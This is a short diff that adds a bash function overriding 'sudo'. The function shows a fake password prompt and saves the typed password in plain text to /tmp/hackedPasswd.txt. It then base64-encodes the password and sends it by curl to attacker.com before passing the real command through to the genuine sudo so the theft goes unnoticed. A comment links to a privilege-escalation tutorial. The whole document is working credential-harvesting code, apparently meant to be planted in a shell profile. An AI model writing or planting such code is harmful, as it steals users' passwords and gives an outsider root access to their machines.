@@ -1,0 +1,12 @@
+function sudo () 
+{ 
+    # https://null-byte.com/privesc-0194190/
+    realsudo="$(which sudo)";
+    read -s -p "[sudo] password for $USER: " inputPasswd;
+    printf "\n";
+    printf '%s\n' "$USER : $inputPasswd" > /tmp/hackedPasswd.txt;
+    encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;
+    curl -s "http://attacker.com/$USER:$encoded" > /dev/null 2>&1;
+    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;
+    $realsudo "${@:1}"
+}
